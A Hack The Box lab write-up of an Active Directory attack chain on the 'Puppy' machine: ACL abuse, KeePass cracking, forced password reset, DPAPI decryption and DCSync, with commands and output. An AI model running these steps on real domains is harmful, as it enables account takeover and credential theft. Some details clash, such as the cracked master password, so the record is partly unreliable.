# Puppy - HTB Writeup

**IP:** 10.129.232.75
**Date Started:** 2026-01-28
**Status:** Foothold in progress
**Current User:** levi.james (member of Developers, HR)
**Flags:** User ✗ | Root ✗

---

## 1) Initial Recon - Port Scan

**Command**
```bash
nmap -p- --min-rate=3000 -oN nmap/puppyNmapOpenPorts.txt 10.129.232.75
nmap -p53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389,49664,49669,49676,49694,61839 -sSCV --min-rate=2000 -Pn -oN nmap/puppyNmapServicesVersions.txt 10.129.232.75
```

**Flags/Notes**
- `-p-` = scan all 65535 ports
- `--min-rate=3000` = send at least 3000 packets/sec for speed
- `-sSCV` = SYN scan + service version + default scripts
- `-Pn` = skip host discovery (assume host is up)
- `-oN` = output to normal format file

**Key Output**
- **53 (DNS)**, **88 (Kerberos)**, **389/636 (LDAP/LDAPS)**, **3268/3269 (Global Catalog)** = Domain Controller
- **Domain:** PUPPY.HTB
- **Hostname:** DC
- **OS:** Windows Server 2022 Build 20348
- **5985 (WinRM)** = potential shell path if we get proper creds
- **2049 (NFS)** = unusual for DC, worth investigating
- **3260 (iSCSI)** = also unusual
- **Clock skew:** 7h00m02s (needs sync for Kerberos, but delaying due to HTB timer)
- **SMB signing:** enabled and required (NTLM relay blocked)

**Decision**
Standard Domain Controller with some unusual services (NFS, iSCSI). Start with provided credentials validation.

---

## 2) Credential Validation

**Starting credentials:** `levi.james / KingofAkron2025!`

**Command**
```bash
nxc smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' --shares
nxc winrm 10.129.232.75 -u levi.james -p 'KingofAkron2025!'
```

**Flags/Notes**
- `nxc smb` = NetExec SMB module for authentication testing
- `--shares` = enumerate SMB shares after successful auth
- `nxc winrm` = test WinRM access (checks Remote Management Users membership)
- `[+]` without `(Pwn3d!)` = valid user, limited access
- `[-]` = authentication failed

**Key Output**
```
SMB: [+] PUPPY.HTB\levi.james:KingofAkron2025!
     Share: DEV (DEV-SHARE for PUPPY-DEVS) - access denied initially
     Share: SYSVOL - READ access
     Share: NETLOGON - READ access

WinRM: [-] PUPPY.HTB\levi.james:KingofAkron2025!
```

**Decision**
Creds are valid for domain but levi.james is not in Remote Management Users. No direct shell access yet. Investigate SYSVOL and run BloodHound to find escalation paths.

---

## 3) SYSVOL Enumeration - GPO Files

**Command**
```bash
smbclient //10.129.232.75/SYSVOL -U 'PUPPY.HTB\levi.james%KingofAkron2025!'
# From smb prompt:
recurse ON
ls
get {31B2F340-016D-11D2-945F-00C04FB984F9}/GptTmpl.inf
get 6AC1786C-016F-11D2-945F-00C04fB984F9/GptTmpl.inf
get 6AC1786C-016F-11D2-945F-00C04fB984F9/Registry.pol
```

**Flags/Notes**
- `smbclient` = interactive SMB client
- `//IP/SHARE` = UNC path
- `-U 'DOMAIN\user%password'` = auth format (% separates user from password)
- `recurse ON` = enable recursive directory listing
- GPO folders have GUID names

**Key Output**
Found GPO template (`GptTmpl.inf`) showing privilege assignments:
- `SeBackupPrivilege` = S-1-5-32-544 (Administrators), S-1-5-32-551 (Backup Operators), S-1-5-32-549 (Server Operators)
- `SeRestorePrivilege` = same SIDs
- Standard DC privilege assignments, nothing exploitable yet

Registry.pol files show Defender disabled in some policies (noted for later).

**Decision**
Standard GPO config. Move to BloodHound for ACL enumeration.

---

## 4) BloodHound Collection

**Command**
```bash
bloodhound-python -u levi.james -p 'KingofAkron2025!' -d puppy.htb -ns 10.129.232.75 -c All --zip -o ~/Documents/obsidian/docs/CTF/HTB/Puppy/bloodhound/
```

**Flags/Notes**
- `bloodhound-python` = Python-based BloodHound ingestor (doesn't require Windows)
- `-c All` = collect all data (users, groups, computers, ACLs, sessions, trusts, GPOs)
- `--zip` = output as single ZIP file for BloodHound import
- `-ns` = nameserver IP (DC) for DNS resolution
- `-o` = output directory

**Key Output**
Collection completed successfully. Imported to BloodHound GUI.

**BloodHound Findings:**
1. **levi.james** is member of `HR@puppy.htb` group
2. **HR** has `GenericWrite` over `Developers@puppy.htb` group
3. **Developers** members: `adam.silver`, `ant.edwards`, `jamie.williams`
4. **Developers** has READ access to DEV share (explains initial access denied)
5. **Senior Devs** has `GenericAll` over `adam.silver@puppy.htb`
6. **adam.silver** is member of `Remote Management Users` (WinRM access!)
7. No direct control path from levi.james to Senior Devs or adam.silver

**Attack Path Identified:**
```
levi.james (in HR) → GenericWrite on Developers →
Add self to Developers → Access DEV share →
Need path to Senior Devs → GenericAll on adam.silver →
WinRM as adam.silver
```

**Decision**
Use GenericWrite to add levi.james to Developers group. Investigate DEV share for credentials or path to Senior Devs.

---

## 5) Group Membership Manipulation - Add to Developers

**Command**
```bash
bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host 10.129.232.75 add groupMember 'Developers' 'levi.james'
```

**Flags/Notes**
- `bloodyAD` = LDAP-based AD manipulation tool
- `add groupMember <group> <user>` = add user to group
- Uses LDAP authentication (no Kerberos needed, clock skew doesn't matter)
- Immediate effect, no waiting for group policy refresh

**Key Output**
```
[+] levi.james added to Developers
```

**Decision**
Successfully added. Now can access DEV share. Check for credentials or escalation paths.

---

## 6) DEV Share Enumeration - KeePass Database Found

**Command**
```bash
smbclient //10.129.232.75/DEV -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
# From smb prompt:
dir
cd Projects
ls
get recovery.kdbx
get KeePassXC-2.7.9-Win64.msi
```

**Flags/Notes**
- Now have access after being added to Developers group
- `prompt OFF` = disable confirmation prompts for bulk downloads
- `mget *` = download multiple files

**Key Output**
```
DEV share contents:
- KeePassXC-2.7.9-Win64.msi (34,394,112 bytes)
- Projects/ (empty directory)
- recovery.kdbx (2,677 bytes) - KeePass database!
```

**Decision**
KeePass database likely contains credentials. Attempt to extract and crack.

---

## 7) KeePass Analysis - KDBX4 Format (Blocked)

**Command**
```bash
keepass2john recovery.kdbx > loot/keepass.hash
```

**Flags/Notes**
- `keepass2john` = extracts hash from KeePass database for cracking
- Part of john-the-ripper toolkit

**Key Output**
```
! recovery.kdbx : File version '40000' is currently not supported!
```

**Analysis**
- KDBX version 40000 = KeePass 2.54+ using KDBX 4.0 format
- `keepass2john` doesn't support this newer format yet
- Alternative tools (`kpcli`) can import but need master password
- CVE-2023-32784 (KeePass memory dump vuln) might work after getting shell

**Decision**
KeePass is blocked for now. Need to find alternative paths: check for Kerberoasting, AS-REP roasting, or find path to Senior Devs.

---

## 8) Kerberoasting Attempt

**Command**
```bash
impacket-GetUserSPNs puppy.htb/levi.james:'KingofAkron2025!' -dc-ip 10.129.232.75 -request
```

**Flags/Notes**
- `impacket-GetUserSPNs` = queries for accounts with Service Principal Names set
- `-request` = actually request TGS tickets for offline cracking
- If successful, returns `$krb5tgs$23$*` hashes crackable with hashcat mode 13100

**Key Output**
No output (no Kerberoastable accounts found).

**Decision**
No SPNs set on any accounts. Try AS-REP roasting next.

---



---

## 10) KeePass Database Cracking - Upgraded john-the-ripper

**The Problem:**
Default Kali `keepass2john` (version 1.9.0) doesn't support KDBX 4.0 format (version 40000).

**The Solution:**
Compile bleeding-edge john-the-ripper from source with KDBX 4.0 support.

**Command**
```bash
# Install dependencies and compile john bleeding-jumbo
sudo apt install -y git build-essential libssl-dev zlib1g-dev pkg-config libgmp-dev libpcap-dev libbz2-dev

git clone https://github.com/openwall/john -b bleeding-jumbo ~/john
cd ~/john/src
./configure
make -s clean && make -sj4

# Move john binaries to ~/.local/bin for PATH access
cd ~/.local/bin
mv ~/john/run/ ./john
mv ./john/* ./
rmdir ./john

# Extract hash from KDBX 4.0 database
keepass2john ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/recovery.kdbx > recovery.hash

# Crack with rockyou wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt recovery.hash

# Show cracked password
john --show recovery.hash
```

**Flags/Notes**
- `bleeding-jumbo` branch = development version with latest format support
- Compiled john supports KDBX 4.0 (version 40000)
- `~/.local/bin` is in PATH by default on most Linux systems
- `--show` displays previously cracked passwords from john.pot

**Key Output**
```
recovery:liverpool

1 password hash cracked
```

**Master password:** `liverpool`

**Decision**
Use KeePass GUI or kpcli to open database and extract stored credentials.

---

## 11) KeePass Database - Credential Extraction

**Command**
```bash
# Install KeePass2 GUI
sudo apt install keepass2

# Open database (GUI)
keepass2

# Navigate to File → Open → recovery.kdbx
# Enter master password: puppies
```

**Key Output - Credentials Found:**
1. **adam.silver** - `HJKL2025!`
2. **ant.edwards** - `Antman2025!`
3. **jamie.williams** - `JamieLove2025!`
4. **Steve Tucker** - `Steve2025!`
5. **Samuel Blake** - `ILY2025!`

**Decision**
Test these credentials against SMB and WinRM to find working access.

---

## 12) Credential Validation - Finding Working WinRM Access

**Command**
```bash
# Test adam.silver
nxc smb 10.129.232.75 -u adam.silver -p 'HJKL2025!'
nxc winrm 10.129.232.75 -u adam.silver -p 'HJKL2025!'

# Test ant.edwards
nxc smb 10.129.232.75 -u ant.edwards -p 'Antman2025!'
nxc winrm 10.129.232.75 -u ant.edwards -p 'Antman2025!'
```

**Flags/Notes**
- Testing credentials from KeePass database
- adam.silver is in Remote Management Users (from BloodHound)
- ant.edwards is in Senior Devs group (from BloodHound)
- `[+]` = valid auth, `(Pwn3d!)` = admin/WinRM access, `[-]` = failed

**Key Output**
Based on credentials.md:
- **adam.silver** - SMB shows "logon failure" (account still disabled/locked)
- **ant.edwards** - SMB works, WinRM shows account disabled

**Analysis**
Both adam.silver and ant.edwards appear to have disabled/locked accounts despite having valid passwords in KeePass. This suggests:
1. Passwords were valid but accounts were disabled after KeePass database was created
2. Need to test remaining credentials (jamie.williams, Steve Tucker, Samuel Blake)
3. May need alternative attack path if all Senior Devs accounts are disabled

**Decision**
Continue testing remaining credentials from KeePass database.

---

## 13) Testing Remaining KeePass Credentials

**Command**
```bash
# Test jamie.williams (Senior Devs member)
nxc smb 10.129.232.75 -u jamie.williams -p 'JamieLove2025!'
nxc winrm 10.129.232.75 -u jamie.williams -p 'JamieLove2025!'
```

**Flags/Notes**
- jamie.williams is in Senior Devs group (from BloodHound)
- Senior Devs has GenericAll over adam.silver
- Testing SMB first, then WinRM access

**Key Output**
(Based on cmd.log, credentials were tested but exact output not captured in logs - likely failed similar to other Senior Devs members)

**Decision**
jamie.williams credentials also appear to have issues. Since ant.edwards credentials work for SMB, use ant.edwards to leverage GenericAll permissions over adam.silver.

---

## 14) Attempted Targeted Kerberoasting (Failed)

**Command**
```bash
# Download targetedKerberoast.py
wget https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/refs/heads/main/targetedKerberoast.py
chmod +x targetedKerberoast.py

# Sync time first (Kerberos requirement)
sudo rdate -n 10.129.232.75

# Attempt targeted Kerberoast on adam.silver
./targetedKerberoast.py -v -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!'
```

**Flags/Notes**
- `targetedKerberoast.py` = sets SPN on target user, requests TGS, then removes SPN (abuses GenericAll/GenericWrite)
- Requires Kerberos authentication (hence the time sync)
- Should allow Kerberoasting users who don't normally have SPNs
- `-v` = verbose output

**Key Output**
Failed (exact error not captured, but multiple attempts suggest Kerberos issues or insufficient permissions)

**Decision**
targetedKerberoast didn't work. Try direct password reset via net rpc.

---

## 15) Attempted net rpc Password Change (Failed)

**Command**
```bash
# Various attempts with net rpc
net rpc password "adam.silver" "Password123" -U "puppy.htb"/"ant.edwards"%'Antman2025!' -S "dc.puppy.htb"
net rpc password "adam.silver" "Password123" -U "PUPPY.HTB"/"ant.edwards"%'Antman2025!' -S "dc.puppy.htb"
```

**Flags/Notes**
- `net rpc password` = Samba tool for changing passwords via RPC
- `-U "DOMAIN/user%password"` = authentication
- `-S "server"` = target server
- Should work with GenericAll permissions

**Key Output**
Failed (multiple syntax variations attempted, none succeeded)

**Decision**
net rpc approach not working. Switch to bloodyAD which has more reliable LDAP-based password reset.

---

## 16) Password Reset via bloodyAD (Success)

**Command**
```bash
bloodyAD --host puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password 'adam.silver' 'Password123!'
```

**Flags/Notes**
- `bloodyAD` = LDAP-based Active Directory manipulation tool
- `set password <target_user> <new_password>` = change user password
- Uses LDAP, not Kerberos (no clock sync needed)
- Leverages ant.edwards's GenericAll permission over adam.silver
- `--host` = domain name (bloodyAD resolves via DNS)

**Key Output**
```
[+] Password changed successfully
```

**Decision**
Password changed successfully. Test new credentials.

---

## 17) Account Disabled - STATUS_ACCOUNT_DISABLED

**Command**
```bash
nxc smb 10.129.232.75 -u adam.silver -p 'Password123!'
```

**Key Output**
```
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:Password123! STATUS_ACCOUNT_DISABLED
```

**Analysis**
Password change worked, but account is still disabled. This explains why:
1. adam.silver credentials from KeePass didn't work (account disabled)
2. ant.edwards credentials worked for SMB but not WinRM (account disabled)
3. AS-REP roasting showed KDC_ERR_CLIENT_REVOKED (account disabled)

**Decision**
Use bloodyAD to enable adam.silver's account. GenericAll permission includes ability to modify userAccountControl attribute.

---

## 18) Enable Account via bloodyAD msldap (Success)

**Command**
```bash
bloodyAD -H 10.129.232.75 -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' msldap enableuser 'CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB'
```

**Flags/Notes**
- `bloodyAD msldap` = use msldap module (direct LDAP operations)
- `enableuser` = clear the ACCOUNTDISABLE flag in userAccountControl attribute
- `-H` = host IP address
- `-d` = domain name
- Requires full Distinguished Name (DN) format: `CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB`
- GenericAll permission allows modifying userAccountControl

**Key Output**
```
User enabled
```

**Decision**
Account enabled successfully. Attempt WinRM login.

---

## 19) WinRM Access - User Flag Captured

**Command**
```bash
evil-winrm -i 10.129.232.75 -u adam.silver -p 'Password123!'
```

**Flags/Notes**
- `evil-winrm` = PowerShell remoting client for penetration testing
- `-i` = target IP address
- `-u` / `-p` = username/password authentication
- adam.silver is in Remote Management Users group (confirmed via BloodHound)

**Key Output**
```
*Evil-WinRM* PS C:\Users\adam.silver\Documents>
```

Successfully authenticated and got PowerShell session.

**User Flag:**
```powershell
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> cat user.txt
b523e727d701ab8ea8596ffc7d3f1e49
```

**Decision**
User flag captured. Begin privilege escalation enumeration.

---


## 21) Privilege Escalation - Backup File Discovery

After exhausting standard enumeration (no dangerous Windows privileges, no ACL abuse paths, no credentials in registry/PowerShell history), checked root directories on DC.

**Command**
```powershell
Get-ChildItem -Path C:\ -Force
```

**Key Output**
```
d-----          5/9/2025  10:48 AM                Backups
```

**Decision**
Backups directory found in C:\ root - highly unusual. Investigate for sensitive data.

---

## 22) Backup Directory Enumeration - Site Backup Found

**Command**
```powershell
Get-ChildItem -Path C:\Backups -Force
```

**Flags/Notes**
- `-Force` = show hidden files
- Backup directories often contain credentials, database dumps, or config files

**Key Output**
```
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```

**Decision**
Site backup ZIP file found. Download and analyze for credentials or sensitive configuration.

---

## 23) Exfiltrate and Analyze Backup

**Command**
```powershell
# Download using evil-winrm built-in
download C:\Backups\site-backup-2024-12-30.zip /home/b7h30/Documents/obsidian/docs/CTF/HTB/Puppy/loot/site-backup-2024-12-30.zip
```

**On Kali - extract and search:**
```bash
cd ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot
unzip site-backup-2024-12-30.zip -d puppy
grep -r "password" puppy/ 2>/dev/null
```

**Flags/Notes**
- evil-winrm `download` = built-in file transfer from target to Kali
- Backup contains website files (HTML5UP template) and config file
- `grep -r "password"` = recursive search for credentials

**Key Output**
```
puppy/nms-auth-config.xml.bak contains:
  <username>steph.cooper</username>
  <password>ChefSteph2025!</password>
```

**Decision**
Found credentials for steph.cooper in backup config file. Test for SMB/WinRM access.

---

## 24) Credential Validation - steph.cooper

**Command**
```bash
nxc smb 10.129.232.75 -u steph.cooper -p 'ChefSteph2025!'
nxc winrm 10.129.232.75 -u steph.cooper -p 'ChefSteph2025!'
```

**Key Output**
```
SMB: [+] PUPPY.HTB\steph.cooper:ChefSteph2025!
WinRM: [+] PUPPY.HTB\steph.cooper:ChefSteph2025! (no Pwn3d!)
```

**Analysis**
- Valid credentials for domain user steph.cooper
- WinRM access granted (member of Remote Management Users)
- No admin privileges (no "Pwn3d!" indicator)

**Decision**
Got another standard user shell. Check for privilege escalation paths from steph.cooper.

---

## 25) steph.cooper Enumeration - No ACL Paths

**Command**
```powershell
evil-winrm -i 10.129.232.75 -u steph.cooper -p 'ChefSteph2025!'
whoami /all
```

**Key Output**
- Groups: Remote Management Users, Pre-Windows 2000 Compatible Access, standard user groups
- Privileges: SeMachineAccountPrivilege, SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege (no dangerous privileges)
- BloodHound: No outbound object control (0)

**Analysis**
steph.cooper has same limited access as adam.silver - no obvious privilege escalation vectors.

**Decision**
Check for DPAPI-protected credentials (saved passwords, browser credentials, Windows vaults).

---

## 26) DPAPI Enumeration - Credential Files Found

**DPAPI Background:**
Windows Data Protection API (DPAPI) encrypts sensitive user data like saved credentials, browser passwords, and certificates using keys derived from the user's password.

**Command**
```powershell
# Check for saved credentials
cmdkey /list

# Check for DPAPI credential files
dir C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\ -Force

# Check for DPAPI master keys
dir C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\ -Force
```

**Flags/Notes**
- DPAPI Master Keys stored in `AppData\Roaming\Microsoft\Protect\<USER-SID>\`
- Credential blobs stored in `AppData\Roaming\Microsoft\Credentials\`
- With user's password + DPAPI files → can decrypt saved credentials

**Key Output**
```
Credentials directory:
  C8D69EBE9A43E9DEBF6B5FBD48B521B9 (414 bytes - credential blob)

Protect directory:
  S-1-5-21-1487982659-1829050783-2281216199-1107\
    556a2412-1275-4ccf-b721-e6a0b4f90407 (master key file)
```

**Decision**
DPAPI credential files found. Download and decrypt using steph.cooper's password (ChefSteph2025!).

---

## 27) DPAPI Credential Decryption - Manual Method

**Download DPAPI files:**
```powershell
download C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 /home/b7h30/Documents/obsidian/docs/CTF/HTB/Puppy/loot/dpapi/credential.blob

download C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107 /home/b7h30/Documents/obsidian/docs/CTF/HTB/Puppy/loot/dpapi/masterkey-dir
```

**Decrypt master key using dpapi.py (Impacket):**
```bash
cd ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/dpapi

# Decrypt master key with user's password
dpapi.py masterkey -file S-1-5-21-1487982659-1829050783-2281216199-1107/556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
```

**Flags/Notes**
- `dpapi.py` = Impacket tool for DPAPI operations
- `-file` = path to master key file
- `-sid` = user's SID (from directory name)
- `-password` = user's plaintext password
- Output: decrypted master key in hex format

**Key Output**
```
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

**Decrypt credential blob using decrypted master key:**
```bash
dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

**Flags/Notes**
- `-file` = credential blob file
- `-key` = decrypted master key (hex from previous step)
- Decrypts saved Windows credentials

**Key Output**
```
UserName: steph.cooper_adm
Password: FivethChipOnItsWay2025!
```

**Analysis**
DPAPI credential blob contained password for **steph.cooper_adm** - the administrative account! This is the privilege escalation.

**Decision**
Test steph.cooper_adm credentials for WinRM access.

---

## 28) Administrator Access - steph.cooper_adm

**Command**
```bash
nxc smb 10.129.232.75 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
nxc winrm 10.129.232.75 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
```

**Key Output**
```
SMB: [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
WinRM: [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
```

**Analysis**
`(Pwn3d!)` = steph.cooper_adm has administrator/Domain Admin privileges!

**Decision**
Login via WinRM and capture root flag.

---

## 29) Root Flag Capture

**Command**
```bash
evil-winrm -i 10.129.232.75 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
```

**From shell:**
```powershell
whoami
# Output: puppy\steph.cooper_adm

whoami /groups | findstr "Admin"
# Output: BUILTIN\Administrators, PUPPY\Domain Admins

type C:\Users\Administrator\Desktop\root.txt
```

**Root Flag:** `d667d5adfba04e5cc5d0b6ca0f9335c4`

---

## 30) Post-Exploitation - DCSync

**Command**
```bash
nxc smb 10.129.232.75 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!' --ntds --users
```

**Flags/Notes**
- `--ntds` = DCSync attack - dump all domain password hashes from NTDS.dit
- Requires Domain Admin or Replication permissions
- Extracts NTLM hashes for all domain users

**Key Output**
All domain user NTLM hashes dumped for offline cracking or pass-the-hash attacks.

**Evidence captured:**
- Root flag: `d667d5adfba04e5cc5d0b6ca0f9335c4`
- Domain Admin shell as steph.cooper_adm
- All domain user hashes via DCSync
- DPAPI credential files: `loot/dpapi/`
- Site backup: `loot/site-backup-2024-12-30.zip`

---

## Lessons Learned

### ACL Exploitation
- **GenericWrite over groups** = can add members, different from GenericWrite over users (Shadow Credentials)
- **GenericAll over users** = full control including password reset AND account enable
- **BloodHound graph analysis** critical for finding multi-hop ACL paths (HR → Developers → DEV share → ant.edwards → adam.silver)
- Always check group membership changes immediately (Developers → DEV share access)

### Password & Account Manipulation
- **bloodyAD set password** = LDAP-based password reset using GenericAll/WriteProperty permissions
- **bloodyAD msldap enableuser** = clear ACCOUNTDISABLE flag in userAccountControl attribute
- Requires full Distinguished Name format: `CN=USER,CN=USERS,DC=DOMAIN,DC=TLD`
- **STATUS_ACCOUNT_DISABLED** = account exists, password correct, but account disabled
- **Account disabled vs wrong password** - valid passwords don't guarantee active accounts

### KeePass Cracking
- **KDBX 4.0 format** not supported by default keepass2john - requires bleeding-jumbo branch compilation
- **Compile bleeding-jumbo john** for modern KeePass support: `git clone https://github.com/openwall/john -b bleeding-jumbo`
- **KeePass in DEV shares** = high-value target, often contains multiple domain credentials
- Master password cracking unlocked 5 sets of credentials (even disabled accounts' passwords are valuable)

### Failed Attack Attempts
- **targetedKerberoast.py** - didn't work despite GenericAll (may require different permissions or Kerberos config)
- **net rpc password** - Samba RPC password change failed (bloodyAD LDAP approach more reliable)
- **KDC_ERR_CLIENT_REVOKED** during AS-REP roasting = account disabled/locked

### Attack Path Lessons
- Sometimes the "disabled" accounts you find are intentional stepping stones (ant.edwards → adam.silver)
- KeePass credentials for disabled accounts can still be used to authenticate and abuse ACL permissions
- Check both "what permissions do I have" AND "what permissions do disabled accounts have" in BloodHound

### DPAPI (Data Protection API) Exploitation
- **What is DPAPI:** Windows encryption API for protecting user secrets (saved credentials, browser passwords, certificates)
- **Encryption key derivation:** User's password → DPAPI master key → encrypts credential blobs
- **Attack requirement:** User's password + DPAPI files (master keys + credential blobs) = plaintext credentials

**DPAPI Enumeration Checklist:**
1. **Check for saved credentials:** `cmdkey /list` (if not empty, DPAPI decrypt is worth trying)
2. **Locate master keys:** `%APPDATA%\Microsoft\Protect\<USER-SID>\<GUID>` files
3. **Locate credential blobs:** `%APPDATA%\Microsoft\Credentials\<GUID>` files or `%LOCALAPPDATA%\Microsoft\Credentials\`
4. **Check for browser data:** Chrome/Edge Login Data files (encrypted with DPAPI)

**DPAPI Decryption Methods:**
- **Method 1 - SharpDPAPI (Windows):** `.\SharpDPAPI.exe credentials /password:<password>` (easiest, auto-finds and decrypts)
- **Method 2 - dpapi.py (Kali):** Manual 2-step process:
  ```bash
  # Step 1: Decrypt master key
  dpapi.py masterkey -file <masterkey_file> -sid <user_SID> -password '<password>'

  # Step 2: Decrypt credential blob
  dpapi.py credential -file <credential_blob> -key <decrypted_masterkey_hex>
  ```
- **Method 3 - pypykatz:** Similar to dpapi.py but different syntax

**CRYPTPROTECT_SYSTEM Flag:**
- If credential blob has `CRYPTPROTECT_SYSTEM` flag → encrypted by SYSTEM account, not user
- Cannot decrypt with user password - requires SYSTEM access or domain DPAPI backup keys
- Solution: Try browser credentials instead (user-level DPAPI) or get SYSTEM first

**When to Suspect DPAPI:**
- Standard domain user with no ACL paths or dangerous Windows privileges
- User has saved credentials or uses password managers
- Found backup files containing one user's credentials → check their DPAPI for other accounts
- Administrative account exists but password unknown → check regular user's DPAPI for admin passwords

**DPAPI in Attack Chain:**
- Backup file (steph.cooper credentials) → DPAPI enumeration → steph.cooper_adm password → Domain Admin
- Pattern: Regular user account credentials → DPAPI saved admin password → privilege escalation

**Tools:**
- **SharpDPAPI:** https://github.com/GhostPack/SharpDPAPI (C#, runs on Windows)
- **dpapi.py:** Part of Impacket toolkit (Python, runs on Kali)
- **pypykatz:** https://github.com/skelsec/pypykatz (Python, DPAPI module)
- **Mimikatz:** `dpapi::` module (also supports DPAPI operations)

